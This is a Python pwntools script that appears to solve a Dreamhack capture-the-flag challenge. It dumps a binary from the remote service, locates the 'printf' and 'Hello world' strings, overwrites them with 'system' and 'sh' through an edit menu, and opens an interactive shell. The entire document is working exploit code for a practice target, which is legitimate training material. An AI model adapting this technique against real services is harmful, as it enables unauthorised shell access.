from pwn import *

r = remote("host3.dreamhack.games", 21552)

def find_word(sentence):
    num = 0
    seperate = 0
    flag = 0

    for i in sentence:
        if i == '\\' and seperate == 0:
            num += 1
            flag = 5
            seperate += 1

        elif seperate == 0:
            num += 1

        if flag != 0:
            seperate += 1
            flag -= 1

        if seperate == 6:
            seperate = 0

    return num

def change(num, change_word):
    for i in change_word:
        r.sendlineafter(b">> ", b'3')
        r.sendlineafter(b": ", str(num).encode())
        r.sendlineafter(b": ", b'y')
        r.sendlineafter(b": ", str(ord(i)).encode())
        num += 1


r.sendlineafter(b">> ", b'1')
r.sendlineafter(b"[B]ytes", b'b')

r.recvuntil(b"b'")
binary = str(r.recvuntil(b"----------Binary end")[:-20])

index1 = binary.find('printf')
index2 = binary.find('Hello world')

binary1 = binary[:index1]
binary2 = binary[:index2]

num1 = find_word(binary1) - 4
num2 = find_word(binary2) - 8

change(num1, "system")
change(num2, "sh\x00")

r.sendlineafter(b">>", b'4')

r.interactive()